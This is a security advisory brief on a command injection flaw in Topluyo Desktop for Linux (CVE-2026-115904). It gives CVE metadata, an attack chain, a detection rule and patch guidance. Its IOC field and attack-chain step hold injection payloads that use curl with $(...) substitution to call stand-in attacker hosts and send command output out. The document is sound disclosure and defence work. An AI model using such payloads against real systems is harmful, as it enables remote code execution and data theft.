---
brief_id: brief-2026-11-02-topluyo-rce
event_id: brief-2026-11-02-topluyo-rce
revision: 1
activity_at: "2026-11-02T13:26:29Z"
title: Topluyo Desktop for Linux OS Command Injection (CVE-2026-115904)
slug: 2026-11-topluyo-rce
description: Topluyo Desktop for Linux versions prior to 2026.9.2410 are vulnerable to OS Command Injection via the openExternalLinks function in utils.js, allowing unauthenticated attackers to achieve RCE through malicious link-handling.
date: "2026-11-02T13:26:29Z"
type: advisory
types:
  - advisory
severities:
  - critical
exploitation_evidence:
  status: unknown
source_assessment:
  reliability: B
  credibility: "3"
  rating: B3
  likelihood: likely
qa_status:
  verdict: pass
  validation_status: Validated against source documentation.
cpes:
  - cpe:2.3:a:topluyo:topluyo_desktop:*:*:*:*:*:linux:*:*
tags:
  - rce
  - command-injection
  - linux
  - desktop-app
vendors:
  - Topluyo
products:
  - Topluyo Desktop For Linux (< 2026.9.2410)
affected_os:
  - Linux
mitre_ttps:
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    subtechnique_id: T1059.004
    subtechnique_name: Unix Shell
    evidence: The application uses child_process.exec() to launch xdg-open which invokes /bin/sh -c.
    confidence_band: high
cves:
  - id: CVE-2026-115904
    cvss: 9.6
    epss: 0.00743
    kev_status: "false"
references:
  - https://sploitus.com/exploit?id=0EA6C5A8-77C6-5E7E-9B86-1DDDE014E8AA
  - https://nvd.nist.gov/vuln/detail/CVE-2026-115904
  - https://sploitus.com/exploit?id=0EA6C5A8-77C6-5E7E-9B86-1DDDE014E8AA&utm_source=rss&utm_medium=rss
iocs:
  - type: url
    value: http://attacker.example/$(curl$IFS-s$IFSsaldirgan.com/$(id|base64))
ioc_counts:
  url: 1
rules:
  - title: Detect Suspicious Shell Execution from Topluyo Desktop
    description: Detects potential command injection attempts originating from Topluyo Desktop for Linux by monitoring for suspicious shell metacharacters in child processes spawned by the application.
    platform: sigma
    severity: high
    tactics:
      - execution
    techniques:
      - T1059.004
    data_sources:
      - process_creation
      - linux
rules_count: 1
action_plan:
  priority: immediate_escalation
  owners:
    - IT Operations
    - SOC
  immediate_actions:
    - action: Upgrade Topluyo Desktop for Linux to 2026.9.2410.
      owner: IT Operations
      due: 24h
      evidence: Vendor patch v2026.9.2410 fixes the command injection.
  hunt_leads:
    - lead: Search for shell meta-characters in command-line arguments of processes spawned by Topluyo.
      technique_id: T1059
      data_needed:
        - Process creation telemetry (Process Name, Parent Process, Command Line)
      priority: high
      confidence: high
      disposition: hunt_now
      evidence: Source document describes command injection via xdg-open execution.
  mitigation_plan:
    - priority: immediate
      action: Upgrade to version 2026.9.2410.
      owner: IT Operations
      addresses: CVE-2026-115904
      evidence: Source states patch was released on 2026-09-25.
---

Topluyo Desktop for Linux contains an OS Command Injection vulnerability (CVE-2026-115904) in the `openExternalLinks()` function within `utils.js`. The application improperly neutralizes user-supplied URLs before passing them to the `child_process.exec()` function, which executes commands via `/bin/sh -c`. Attackers can trigger arbitrary code execution by crafting a malicious URL containing shell meta-characters. The vulnerability was patched in version 2026.9.2410.

## Attack Chain
1. Attacker crafts a URL string containing command substitution syntax, such as `$(curl -s attacker.com/id)`.
2. Attacker hosts or delivers the malicious link to a target user via the application interface (e.g., chat, notification, or link preview).
3. The target user interacts with the link (clicks).
4. The `openExternalLinks()` function receives the URL.
5. The application invokes `child_process.exec("xdg-open [malicious_url]")`.
6. The system shell interprets the command substitution inside the URL parameter before executing `xdg-open`.
7. Arbitrary commands execute in the context of the user running the Topluyo Desktop application.

## Impact
Successful exploitation leads to full remote code execution in the context of the current desktop user. Impact includes arbitrary file access, credential theft, persistence installation (e.g., modifying `~/.bashrc` or `autostart`), and the establishment of reverse shells.

## Recommendation
- Upgrade Topluyo Desktop for Linux to version 2026.9.2410 or later immediately.
- For developers, replace `child_process.exec()` with `child_process.execFile()` when handling external system commands to prevent shell interpretation of arguments.
- Implement strict allow-listing for URL schemes (e.g., limit to `http:` and `https:`) before passing values to system calls.
